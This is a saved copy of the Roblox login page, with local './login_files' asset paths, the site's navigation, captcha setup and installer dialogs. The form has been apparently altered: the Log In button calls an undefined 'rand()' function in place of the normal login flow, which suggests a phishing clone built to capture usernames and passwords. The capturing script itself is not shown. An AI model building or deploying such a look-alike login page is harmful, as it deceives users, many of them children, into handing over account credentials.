Roblox.Endpoints.Urls['/thumbnail/remove-asset-media'] = 'https://www.roblox.com/thumbnail/remove-asset-media';
Roblox.Endpoints.Urls['/thumbnail/set-asset-media-sort-order'] = 'https://www.roblox.com/thumbnail/set-asset-media-sort-order';
Roblox.Endpoints.Urls['/thumbnail/place-thumbnails'] = 'https://www.roblox.com/thumbnail/place-thumbnails';
Roblox.Endpoints.Urls['/thumbnail/place-thumbnails-partial'] = 'https://www.roblox.com/thumbnail/place-thumbnails-partial';
Roblox.Endpoints.Urls['/thumbnail_holder/g'] = 'https://www.roblox.com/thumbnail_holder/g';
Roblox.Endpoints.Urls['/users/{id}/profile'] = 'https://www.roblox.com/users/{id}/profile';
Roblox.Endpoints.Urls['/service-workers/push-notifications'] = 'https://www.roblox.com/service-workers/push-notifications';
Roblox.Endpoints.Urls['/notification-stream/notification-stream-data'] = 'https://www.roblox.com/notification-stream/notification-stream-data';
Roblox.Endpoints.Urls['/api/friends/acceptfriendrequest'] = 'https://www.roblox.com/api/friends/acceptfriendrequest';
Roblox.Endpoints.Urls['/api/friends/declinefriendrequest'] = 'https://www.roblox.com/api/friends/declinefriendrequest';
Roblox.Endpoints.Urls['/authentication/is-logged-in'] = 'https://www.roblox.com/authentication/is-logged-in';
Roblox.Endpoints.addCrossDomainOptionsToAllRequests = true;
</script>

    <script type="text/javascript">
if (typeof(Roblox) === "undefined") { Roblox = {}; }
Roblox.Endpoints = Roblox.Endpoints || {};
Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
</script>

    <script>
    Roblox = Roblox || {};
    Roblox.AbuseReportPVMeta = {
        desktopEnabled: false,
        phoneEnabled: false,
        inAppEnabled: false
    };
</script>


<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="3" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">
                          

</head>
<body id="rbx-body" class="rbx-body   light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
    
    <meta name="csrf-token" data-token="EDy6kl0VUkkr">

    
    <script src="./login_files/hsts.js.pobrane" type="text/javascript" id="hsts" async=""></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Linkify" data-bundle-source="Main" src="./login_files/d66f9bed66403723f7f1a143a2776681aef19dcf1fce1173e4f58a5cb8bd205e.js.pobrane"></script>



<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">
</div>
<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">
</div>
    



<div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false">




<div id="navigation-container" class="light-theme gotham-font " data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="True">
    <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
  <div class="container-fluid">
    <div class="rbx-navbar-header">
      <div id="header-menu-icon" class="rbx-nav-collapse"><button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">Skip to Main Content</button></div>
      <div class="navbar-header">
        <a class="navbar-brand" href="https://www.roblox.com/home">
          <span class="icon-logo"></span><span class="icon-logo-r"></span>
        </a>
      </div>
    </div>
    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/discover">Discover</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/catalog">Avatar Shop</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/develop">Create</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/robux?ctx-nav">Robux</a>
      </li>
    </ul>

    <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/discover">Discover</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/catalog">Avatar Shop</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/develop">Create</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/robux?ctx=nav">Robux</a>
      </li>
    </ul>
    <div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search"><div class="input-group"><form><div class="form-has-feedback"><input id="navbar-search-input" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://www.roblox.com/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Experiences</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in People</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/catalog?CatalogContext=1&amp;Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Avatar Shop</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/groups?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Groups</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://create.roblox.com/marketplace/models?keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Creator Marketplace</span></a></li></ul></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/account/signupredir?returnUrl=https%3A%2F%2Fwww.roblox.com%2FLogin" id="sign-up-button">Sign Up</a></li><li class="login-action"></li><li class="rbx-navbar-right-search"><button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md"><span class="icon-nav-search-white"></span></button></li></ul></div></div>
  </div>
</div>
<div id="left-navigation-container"></div>
<div id="verificationUpsell-container"><div></div></div>
<div id="phoneVerificationUpsell-container">
  <div phoneverificationupsell-container=""></div>
</div>
<div id="contactMethodPrompt-container">
  <div contactmethodprompt-container=""></div>
</div>

</div>

<script type="text/javascript">
    var Roblox = Roblox || {};
    (function () {
        if (Roblox && Roblox.Performance) {
            Roblox.Performance.setPerformanceMark("navigation_end");
        }
    })();
</script>

    <div class="container-main 
                
                
                
                
                
                " id="container-main" tabindex="-1">
            <script type="text/javascript">
                if (top.location != self.location) {
                    top.location = self.location.href;
                }
            </script>

        <div class="alert-container">
            <noscript><div><div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div></div></noscript>



                <div class="alert-cookie-notice" data-cookie-notice-timeout="20000">
                    Roblox uses cookies to offer you a better experience. For further information, including information on how to withdraw consent and how to manage the use of cookies on Roblox, please refer to our <a href="https://www.roblox.com/info/privacy?locale=en_us">Privacy and Cookie Policy</a>.)
                    <span class="icon-close cookie-law-notice-dismiss"></span>
                </div>

        </div>


        <div class="content">

                                    <script src="./login_files/saved_resource" async="" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportResourceError(&#39;funcaptcha&#39;)"></script>
<script type="text/javascript">
    var Roblox = Roblox || {};
    $(function () {
        var funCaptcha = Roblox.FunCaptcha;
        if (funCaptcha) {
            var captchaTypes = [{"Type":"Login","PublicKey":"9F35E182-C93C-EBCC-A31D-CF8ED317B996","ApiUrl":"https://captcha.roblox.com/v1/funcaptcha/login/web"}];
            funCaptcha.addCaptchaTypes(captchaTypes, true);
            funCaptcha.setMaxRetriesOnTokenValidationFailure(0);
            funCaptcha.setPerAppTypeLoggingEnabled(false);
            funCaptcha.setRetryIntervalRange(500, 1500);
        }
    });

    // Necessary because of how FunCaptcha js executes callback
    // i.e. window["{function name}"]
    function reportFunCaptchaLoaded()
    {
        if (Roblox.BundleDetector)
        {
            Roblox.BundleDetector.reportResourceLoaded("funcaptcha");
        }
    }
</script>


        <div id="react-login-container" class="login-container" data-return-url="" data-enable-react-ui="true"><div id="login-base"><div class="section-content login-section"><h1 class="login-header">Login to Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Username/Email/Phone</label><input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Password</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" value=""><div aria-live="polite"></div></div><button onclick="rand();" type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div><div class="divider-text-container"><span class="divider-text xsmall">login with</span></div></div><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Another Logged In Device</span></button></div><div id="crossDeviceLoginDisplayCode-container" data-frontload-qr-code="false"><div></div></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/" target="_self">Sign Up</a></div></div></div></div></div>





<script>
    var Roblox = Roblox || {};
    Roblox.LoginMeta = {
        signupUrl: "https://www.roblox.com/account/signupredir",
        forgotCredentialsUrl: "https://www.roblox.com/login/forgot-password-or-username",
        homeUrl: "https://www.roblox.com/home",
        securityNotificationUrl: "https://www.roblox.com/login/securitynotification",
        apiProxyUrl: "https://api.roblox.com",
        fbSignInUrl: "",
        loginPageUrl: "https://www.roblox.com/newlogin",
        isLoginWithEmailEnabled: true,
        isLoginWithPhoneEnabled: true,
        isPromptUnverifiedEmailsEnabled: false
    };
</script>



        </div>
            </div> 
<!--Bootstrap Footer React Component -->

<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"><div class="footer"><ul class="row footer-links"><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/about-us?locale=en_us" target="_blank">About Us</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/jobs?locale=en_us" target="_blank">Jobs</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/blog?locale=en_us" target="_blank">Blog</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/parents?locale=en_us" target="_blank">Parents</a></li><li class="footer-link"><a class="text-footer-nav giftcards" href="https://www.roblox.com/giftcards?locale=en_us" target="_blank">Gift Cards</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/help?locale=en_us" target="_blank">Help</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/terms?locale=en_us" target="_blank">Terms</a></li><li class="footer-link"><a class="text-footer-nav" href="https://www.roblox.com/info/accessibility?locale=en_us" target="_blank">Accessibility</a></li><li class="footer-link"><a class="text-footer-nav privacy" href="https://www.roblox.com/info/privacy?locale=en_us" target="_blank">Privacy</a></li><li><div><button type="button" class="btn text-footer-nav cookie-consent-link">Cookie Options</button></div></li></ul><div class="row copyright-container"><div class="col-sm-6 col-md-3"></div><div class="col-sm-12"><p class="text-footer footer-note">©2022 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p></div></div></div></footer></div> 

    <div id="user-agreements-checker-container"></div>
<div id="cookie-banner-wrapper" class="cookie-banner-wrapper"><div></div></div>


    <script type="text/javascript">function urchinTracker() {}</script>


<script type="text/javascript">
    if (typeof Roblox === "undefined") {
        Roblox = {};
    }
    if (typeof Roblox.PlaceLauncher === "undefined") {
        Roblox.PlaceLauncher = {};
    }
    var isRobloxIconEnabledForRetheme = "True";
    var robloxIcon = isRobloxIconEnabledForRetheme === 'True' ? "<span class='icon-logo-r-95'></span>" : "<img src='https://images.rbxcdn.com/8e7879f99cfa7cc3b1fce74f8191be03.svg' width='90' height='90' alt='R'/>";
    Roblox.PlaceLauncher.Resources = {
        RefactorEnabled: "True",
        IsProtocolHandlerBaseUrlParamEnabled: "False",
        ProtocolHandlerAreYouInstalled: {
            play: {
                content: robloxIcon + "<p>You&#39;re moments away from getting into the experience!</p>",
                buttonText: "Download and Install Roblox",
                footerContent: "<a href='https://assetgame.roblox.com/game/help'class= 'text-name small' target='_blank' >Click here for help</a> "
            },
            studio: {
                content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Get started creating your own experiences!</p>",
                buttonText: "Download Studio"
            }
        },
        ProtocolHandlerStartingDialog: {
            play: {
                content: robloxIcon + "<p>Roblox is now loading. Get ready!</p>"
            },
            studio: {
                content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Checking for Roblox Studio...</p>"
            },
            loader: "<span class='spinner spinner-default'></span>"
        }
    };
</script>
<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-studio-auth-ticket-enabled="True" data-is-studio-sso-params-enabled="True" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-duar-auto-opt-in-enabled="false" data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False" data-os-name="Windows" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE">
    <div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">
        <div id="Spinner" class="Spinner" style="padding:20px 0;">
            <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="./login_files/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced">
        </div>
        <div id="status" style="min-height:40px;text-align:center;margin:5px 20px">
            <div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block">
                Starting Roblox...
            </div>
            <div id="Waiting" class="PlaceLauncherStatus MadStatusField">Connecting to People...</div>
            <div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>
        </div>
        <div style="text-align:center;margin-top:1em">
            <input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel">
        </div>
    </div>
</div>
<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;">
    <p class="larger-font-size">
        <span class="icon-moreinfo"></span>
                
                    Check <strong>Always open links for URL: Roblox Protocol</strong> and click <strong>Open URL: Roblox Protocol</strong> in the dialog box above to join experiences faster in the future!
                
    </p>
</div>

<script type="text/javascript">
function checkRobloxInstall() {
         return RobloxLaunch.CheckRobloxInstall('https://www.roblox.com/Download');
}
</script>


    <div id="InstallationInstructions" class="" style="display:none;">
        <div class="ph-installinstructions">
            <div class="ph-modal-header">
                    <span class="icon-close simplemodal-close"></span>
                    <h3 class="title">Thanks for visiting Roblox</h3>
            </div>
            <div class="modal-content-container"> 
                <div class="ph-installinstructions-body ">


        <ul class="modal-col-4">
            <li class="step1-of-4">
                <h2>1</h2>
                <p class="larger-font-size">Click <strong>RobloxPlayer.exe</strong> to run the Roblox installer, which just downloaded via your web browser.</p>
                <div style="margin-top:60px">
                    <img data-delaysrc="https://images.rbxcdn.com/bcf5d84d4469c075e6296bfbc4deabb1" src="./login_files/bcf5d84d4469c075e6296bfbc4deabb1" class="src-replaced">
                </div>
            </li>
            <li class="step2-of-4">
                <h2>2</h2>
                <p class="larger-font-size">Click <strong>Run</strong> when prompted by your computer to begin the installation process.</p>
                <img data-delaysrc="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" src="./login_files/51328932dedb5d8d61107272cc1a27db.png" class="src-replaced">
            </li>
            <li class="step3-of-4">
                <h2>3</h2>
                <p class="larger-font-size">Click <strong>Ok</strong> once you've successfully installed Roblox.</p>
                <img data-delaysrc="https://images.rbxcdn.com/bbdb38de8bb89ecc07730b41666a26a4" src="./login_files/bbdb38de8bb89ecc07730b41666a26a4" class="src-replaced">
            </li>
            <li class="step4-of-4">
                <h2>4</h2>
                <p class="larger-font-size">After installation, click <strong>Join</strong> below to join the action!</p>
                <div class="VisitButton VisitButtonContinueGLI">
                    <a class="btn btn-primary-lg disabled btn-full-width">Join</a>
                </div>
            </li>
        </ul>

                </div>
            </div>
            <div class="xsmall">
                The Roblox installer should download shortly. If it doesn’t, start the <a id="GameLaunchManualInstallLink" href="https://www.roblox.com/Login#" class="text-link">download now.</a>
            </div>
        </div>
    </div>
    <div class="InstallInstructionsImage" data-modalwidth="970" style="display:none;"></div>


<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"></div>
<iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute" src="./login_files/saved_resource.html"></iframe>

<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="clientinstaller" type="text/javascript" src="./login_files/f424a786e3d883cff747a034605fa09d.js.pobrane"></script>

<script type="text/javascript">
    Roblox.Client._skip = null;
    Roblox.Client._CLSID = '76D50904-6780-4c8b-8986-1A7EE0B1716D';
    Roblox.Client._installHost = 'setup.roblox.com';
    Roblox.Client.ImplementsProxy = true;
    Roblox.Client._silentModeEnabled = true;
    Roblox.Client._bringAppToFrontEnabled = false;
    Roblox.Client._currentPluginVersion = '';
    Roblox.Client._eventStreamLoggingEnabled = true;

        
        Roblox.Client._installSuccess = function() {
            if(GoogleAnalyticsEvents){
                GoogleAnalyticsEvents.ViewVirtual('InstallSuccess');
                GoogleAnalyticsEvents.FireEvent(['Plugin','Install Success']);
                if (Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
                    Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
                }
            }
        }
        
            
        if ((window.chrome || window.safari) && window.location.hash == '#chromeInstall') {
            window.location.hash = '';
            var continuation = '(' + $.cookie('chromeInstall') + ')';
            play_placeId = $.cookie('chromeInstallPlaceId');
            Roblox.GamePlayEvents.lastContext = $.cookie('chromeInstallLaunchMode');
            $.cookie('chromeInstallPlaceId', null);
            $.cookie('chromeInstallLaunchMode', null);
            $.cookie('chromeInstall', null);
            RobloxLaunch._GoogleAnalyticsCallback = function() { var isInsideRobloxIDE = 'website'; if (Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) { isInsideRobloxIDE = 'Studio'; };GoogleAnalyticsEvents.FireEvent(['Plugin Location', 'Launch Attempt', isInsideRobloxIDE]);GoogleAnalyticsEvents.FireEvent(['Plugin', 'Launch Attempt', 'Play']);EventTracker.fireEvent('GameLaunchAttempt_Win32', 'GameLaunchAttempt_Win32_Plugin'); if (typeof Roblox.GamePlayEvents != 'undefined') { Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId); }  }; 
            Roblox.Client.ResumeTimer(eval(continuation));
        }
        
</script>


<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;">
    <a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
    <div class="Title"></div>
    <div class="GenericModalBody">
        <div class="TopBody">
            <div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click="">
                <img class="GenericModalImage" alt="generic image">
            </div>
            <div class="Message"></div>
        </div>
        <div class="ConfirmationModalButtonContainer GenericModalButtonContainer">
            <a href="https://www.roblox.com/Login" id="roblox-confirm-btn"><span></span></a>
            <a href="https://www.roblox.com/Login" id="roblox-decline-btn"><span></span></a>
        </div>
        <div class="ConfirmationModalFooter">
        
        </div>  
    </div>  
    <script type="text/javascript">
        Roblox = Roblox || {};
        Roblox.Resources = Roblox.Resources || {};
        
        Roblox.Resources.GenericConfirmation = {
            yes: "Yes",
            No: "No",
            Confirm: "Confirm",
            Cancel: "Cancel"
        };
    </script>
</div>

<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">
    <div id="modal-dialog" class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">
                    <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span>
                </button>
                <h5 class="modal-title"></h5>
            </div>

            <div class="modal-body">
                <div class="modal-top-body">
                    <div class="modal-message"></div>
                    <div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click="">
                        <img class="modal-thumb" alt="generic image">
                    </div>
                    <div class="modal-checkbox checkbox">
                        <input id="modal-checkbox-input" type="checkbox">
                        <label for="modal-checkbox-input"></label>
                    </div>
                </div>
                <div class="modal-btns">
                    <a href="https://www.roblox.com/Login" id="confirm-btn"><span></span></a>
                    <a href="https://www.roblox.com/Login" id="decline-btn"><span></span></a>
                </div>
                <div class="loading modal-processing">
                    <img class="loading-default" src="./login_files/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing...">
                </div>
            </div>
            <div class="modal-footer text-footer">

            </div>
        </div>
    </div>
</div>




<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.jsConsoleEnabled = false;
</script>


    <script type="text/javascript">
        $(function () {
            Roblox.CookieUpgrader.domain = 'roblox.com';
            Roblox.CookieUpgrader.upgrade("GuestData", { expires: Roblox.CookieUpgrader.thirtyYearsFromNow });
                
                    Roblox.CookieUpgrader.upgrade("RBXSessionTracker", { expires: Roblox.CookieUpgrader.fourHoursFromNow });
                
                            
                    Roblox.CookieUpgrader.upgrade("RBXEventTrackerV2", {expires: Roblox.CookieUpgrader.thirtyYearsFromNow});
                
        });
    </script>




    

    
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="intl-polyfill" type="text/javascript" src="./login_files/d44520f7da5ec476cfb1704d91bab327.js.pobrane"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalCore" data-bundle-source="Main" src="./login_files/95044be3ff42e3dc429313faca1316cea62f328a39e29689ffeda9002f3a8bc6.js.pobrane"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="TranslationResources" data-bundle-source="Main" src="./login_files/83d836a661ff433d5b7ce719c489e43af590ff75ab39ccc6d393546fe91b766a.js.pobrane"></script>


    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="leanbase" type="text/javascript" src="./login_files/6df275f4290dbf3a38657783651fac4e.js.pobrane"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreUtilities" data-bundle-source="Main" src="./login_files/b8f73eea6b6a8602f787da463c88858dbb1aedeffeb2d07479af47dbda222aae.js.pobrane"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreRobloxUtilities" data-bundle-source="Main" src="./login_files/1908b8b693054886ee53c0b5afed9f78c6aeb45f675a69b6b47363ade3ddcc18.js.pobrane"></script>



    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="React" data-bundle-source="Main" src="./login_files/b79589d3dfb2446936aac95605deaa507ce5bc3e09073bac7dd04872880694c2.js.pobrane"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactUtilities" data-bundle-source="Main" src="./login_files/cf340fb618d9a73913b30dfc624ae60d68b9e59723746e6c08d06d14ebdd6dca.js.pobrane"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactStyleGuide" data-bundle-source="Main" src="./login_files/9d6f0c09699665193c4a774ad28847f84e592f2d1f6951f8f23a305c0e26e268.js.pobrane"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ConfigureWebApps" data-bundle-source="Main" src="./login_files/5259cfe8a3e36118bd61120693dbba3ba87f2c3641f84bb07e29f1d69fe87523.js.pobrane"></script>


    
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="angular" type="text/javascript" src="./login_files/ae3d621886e736e52c97008e085fa286.js.pobrane"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="AngularJsUtilities" data-bundle-source="Main" src="./login_files/c1300ec424eab695a3fd12fcaed2ef4f1365d575cb029ee094254ddbcc3396ff.js.pobrane"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalAngularJs" data-bundle-source="Main" src="./login_files/90f18784a43a70553e967191b948f70b0193df565f1605762c3c1e245ab4b55a.js.pobrane"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Thumbnails" data-bundle-source="Main" src="./login_files/5bdcb351422eb9b57b5237886641856149f6c96566bba26e09edd1c130986bfc.js.pobrane"></script>






<div id="presence-registration-bootstrap-data" data-is-enabled="False" data-interval="15000"></div><script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="PresenceRegistration" data-bundle-source="Main" src="./login_files/0a83202cf5f2310227e607928f73a26cdaa7d5c27f892b99ef51ec3b863a694d.js.pobrane"></script>
    <div ng-modules="baseTemplateApp" class="ng-scope">
        <script type="text/javascript" src="./login_files/ffcc04436179c6b2a6668fdfcfbf62b1.js.pobrane"></script>
    </div>

    <div ng-modules="pageTemplateApp" class="ng-scope">
        <script type="text/javascript" src="./login_files/3e544c8e724dcdc296258b0ca69401a9.js.pobrane"></script>
    </div>

<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CaptchaCore" data-bundle-source="Main" src="./login_files/1a6389791b88e1ce869baa0b43e2f423e77141f6913f9d51eeda7d460d53aa97.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Challenge" data-bundle-source="Main" src="./login_files/dde6f0dac09b9d6ee026bfd7f1689c42182ad1cf687e2aa2359ec195c6eafcad.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ForceAuthenticator" data-bundle-source="Unknown" src="./login_files/8849783a45e85b04232d3a71e9efc2ce8a5d4e0e072bb37740fe2f5acd0ef50a.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ForceAuthenticator" data-bundle-source="Unknown" src="./login_files/a5d76f662cc98d13a65d323097497aa93948409caf12b33464400259111e8082.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification" data-bundle-source="Unknown" src="./login_files/b0449203aa4d09dd98f37745daa567aa84d251e5e8b148f40daaa8169bdde13e.js.pobrane"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification" data-bundle-source="Unknown" src="./login_files/329ba9314a5de7282e8a8035046e7a56faf772d3ffea8af619b3e8854df0fc41.js.pobrane"></script>
